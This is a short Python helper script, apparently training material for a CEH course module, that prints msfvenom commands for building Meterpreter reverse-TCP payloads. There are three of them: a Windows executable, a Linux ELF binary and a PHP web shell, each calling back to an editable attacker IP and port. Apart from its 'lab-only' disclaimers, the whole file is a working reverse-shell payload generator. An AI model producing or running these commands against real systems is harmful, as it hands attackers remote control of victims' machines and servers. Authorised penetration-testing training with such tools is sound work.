#!/usr/bin/env python3
# LAB-ONLY: Metasploit Payload Generator Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates msfvenom payload commands for various platforms
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_IP = "192.168.100.1"
LAB_ATTACKER_PORT = "4444"
LAB_OUTPUT_FILE_BASE = "payload"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Metasploit Payload Generator Helper")
    print("="*80)
    print("# 1. Windows EXE reverse TCP:")
    print(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={LAB_ATTACKER_IP} LPORT={LAB_ATTACKER_PORT} -f exe -o {LAB_OUTPUT_FILE_BASE}.exe")
    print()
    print("# 2. Linux ELF reverse TCP:")
    print(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LAB_ATTACKER_IP} LPORT={LAB_ATTACKER_PORT} -f elf -o {LAB_OUTPUT_FILE_BASE}.elf")
    print()
    print("# 3. PHP web shell payload:")
    print(f"msfvenom -p php/meterpreter/reverse_tcp LHOST={LAB_ATTACKER_IP} LPORT={LAB_ATTACKER_PORT} -f raw > {LAB_OUTPUT_FILE_BASE}.php")
    print()

if __name__ == "__main__":
    main()
